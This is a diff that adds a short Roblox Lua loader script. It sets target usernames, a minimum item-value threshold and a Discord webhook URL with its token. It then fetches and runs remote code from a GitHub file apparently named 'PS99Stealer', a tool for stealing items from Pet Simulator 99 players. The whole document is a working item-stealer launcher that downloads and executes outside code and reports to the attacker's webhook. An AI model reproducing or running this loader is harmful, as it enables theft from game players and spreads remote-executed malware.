@@ -1,0 +1,6 @@
+Username = "momogg101"
+Username2 = "momogg101"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1347535291640057906/wewUtOdJ4ZBWUlxvshDLX1LmIylwnWj6rQaiwt_v80aYJNttDabsWXyt-85B0FimYtsS"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
